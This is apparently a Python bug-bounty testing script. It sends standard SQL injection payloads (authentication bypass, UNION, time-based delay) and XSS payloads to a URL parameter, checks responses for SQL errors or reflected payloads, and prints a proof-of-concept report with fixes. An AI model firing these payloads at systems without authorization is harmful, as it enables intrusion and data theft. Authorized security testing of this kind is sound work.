#!/usr/bin/env python3
"""
🎯 MANUAL TESTING SCRIPT FOR PROOF OF CONCEPT GENERATION
Step-by-step vulnerability testing with detailed output
"""

import requests
import urllib.parse
from vulnerability_tester import VulnerabilityTester

def manual_sql_injection_test(target_url, parameter):
    """
    Step-by-step SQL injection testing with detailed output
    """
    print("🔍 MANUAL SQL INJECTION TESTING")
    print(f"Target: {target_url}")
    print(f"Parameter: {parameter}")
    print("-" * 50)
    
    # Basic payloads for manual testing
    payloads = [
        "'",  # Basic quote test
        "' OR '1'='1",  # Authentication bypass
        "' UNION SELECT NULL--",  # Union injection
        "'; WAITFOR DELAY '00:00:05'--",  # Time-based
    ]
    
    for i, payload in enumerate(payloads, 1):
        print(f"\n{i}. Testing payload: {payload}")
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{target_url}?{parameter}={encoded_payload}"
        
        print(f"   Full URL: {test_url}")
        print(f"   Encoded payload: {encoded_payload}")
        
        try:
            response = requests.get(test_url, timeout=10)
            print(f"   Status Code: {response.status_code}")
            print(f"   Response Length: {len(response.text)}")
            
            # Check for common SQL error patterns
            error_patterns = [
                "SQL syntax",
                "mysql_fetch",
                "ORA-",
                "Microsoft OLE DB",
                "ODBC SQL Server Driver"
            ]
            
            for pattern in error_patterns:
                if pattern.lower() in response.text.lower():
                    print(f"   🚨 POTENTIAL SQL ERROR DETECTED: {pattern}")
                    
        except Exception as e:
            print(f"   ❌ Request failed: {e}")
    
    print("\n" + "="*50)

def manual_xss_test(target_url, parameter):
    """
    Step-by-step XSS testing with detailed output
    """
    print("🚨 MANUAL XSS TESTING")
    print(f"Target: {target_url}")
    print(f"Parameter: {parameter}")
    print("-" * 50)
    
    # Basic XSS payloads for manual testing
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
    ]
    
    for i, payload in enumerate(payloads, 1):
        print(f"\n{i}. Testing payload: {payload}")
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{target_url}?{parameter}={encoded_payload}"
        
        print(f"   Full URL: {test_url}")
        print(f"   Encoded payload: {encoded_payload}")
        
        try:
            response = requests.get(test_url, timeout=10)
            print(f"   Status Code: {response.status_code}")
            
            # Check if payload is reflected in response
            if payload in response.text:
                print(f"   🚨 PAYLOAD REFLECTED (Potential XSS)")
            elif payload.replace('"', '&quot;').replace('<', '&lt;') in response.text:
                print(f"   ⚠️  PAYLOAD REFLECTED BUT ENCODED")
            else:
                print(f"   ✅ PAYLOAD NOT REFLECTED")
                
        except Exception as e:
            print(f"   ❌ Request failed: {e}")
    
    print("\n" + "="*50)

def generate_poc_report(vulnerability_type, target_url, payload, description):
    """
    Generate a formatted PoC report
    """
    print("\n📝 PROOF OF CONCEPT REPORT")
    print("="*50)
    print(f"Vulnerability Type: {vulnerability_type}")
    print(f"Target URL: {target_url}")
    print(f"Payload Used: {payload}")
    print(f"Description: {description}")
    print("\nSteps to Reproduce:")
    print("1. Navigate to the target URL")
    print("2. Insert the payload in the specified parameter")
    print("3. Submit the request")
    print("4. Observe the response for vulnerability indicators")
    print("\nRecommendation:")
    if vulnerability_type.lower() == "sql injection":
        print("- Use parameterized queries")
        print("- Implement input validation")
        print("- Apply principle of least privilege")
    elif vulnerability_type.lower() == "xss":
        print("- Implement output encoding")
        print("- Use Content Security Policy (CSP)")
        print("- Validate and sanitize input")
    print("="*50)

if __name__ == "__main__":
    print("🎯 BUG BOUNTY HUNTER PRO - MANUAL TESTING SUITE")
    print("=" * 60)
    
    # Example usage
    target = "https://example.com/search"
    
    # Test SQL injection
    manual_sql_injection_test(target, "id")
    
    # Test XSS
    manual_xss_test(target, "q")
    
    # Generate sample PoC report
    generate_poc_report(
        "SQL Injection", 
        target, 
        "' OR '1'='1", 
        "Authentication bypass through SQL injection in login form"
    )
